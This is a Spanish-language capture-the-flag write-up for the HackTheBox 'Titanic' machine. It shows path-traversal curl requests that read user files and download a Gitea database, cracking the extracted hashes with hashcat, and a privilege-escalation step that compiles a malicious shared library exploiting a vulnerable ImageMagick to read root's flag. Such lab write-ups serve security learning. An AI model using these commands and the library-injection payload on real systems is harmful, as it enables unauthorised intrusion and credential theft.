
---


![image](../Imágenes/20250216012759.png)

# Enumeración

![image](../Imágenes/20250216002502.png)

![image](../Imágenes/20250216004228.png)

![image](../Imágenes/20250216004327.png)

![image](../Imágenes/20250216004711.png)

Al comprar un ticket, nos da un json y seguido, se realiza una petición llamando a ese json:

![image](../Imágenes/20250216004825.png)

Y verificamos que existe el path traversal:

![image](../Imágenes/20250216005025.png)


Ralizando un ´curl´ para la flag de user:

```
curl http://titanic.htb/download?ticket=/home/developer/user.txt
```

![image](../Imágenes/20250216005222.png)

Haciendo fuzzing encontramos un subdominio `dev`

![image](../Imágenes/20250216010601.png)

gracias al cual vemos que hay un gitea corriendo:

![image](../Imágenes/20250216010646.png)

Y llegamos a su `db`:

![image](../Imágenes/20250216010719.png)

La descargamos:

```
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' --output gitea.db
```

Usando [https://gist.github.com/h4rithd/0c5da36a...71cf14e271](https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271) obtenemos los hashes para su descifrado con hashcat: 

```  
python3 gitea2hashcat.py gitea.db >> hashes
```

![image](../Imágenes/20250216011414.png)

Con `hashcat` y el `rockyou`:

![image](../Imágenes/20250216011556.png)

Nos conectamos a developer por ssh con las credenciales adquiridas:

![image](../Imágenes/20250216012245.png)

Dentro de `/opt/scripts` hay un script que utiliza `/usr/bin/magick` en una versión vulnerable 
   
`/usr/bin/magick --version`

![image](../Imágenes/20250216012347.png)

Cuyo exploit es:
 https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
```
cd /opt/app/static/assets/images
```

```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){       system("cat /root/root.txt > /tmp/root.txt");       exit(0);   }
EOF
```
 
 `cp entertainment.jpg root.jpg`
  
 `cat /tmp/root.txt`

![image](../Imágenes/20250216012650.png)

HAPPY HACKING!!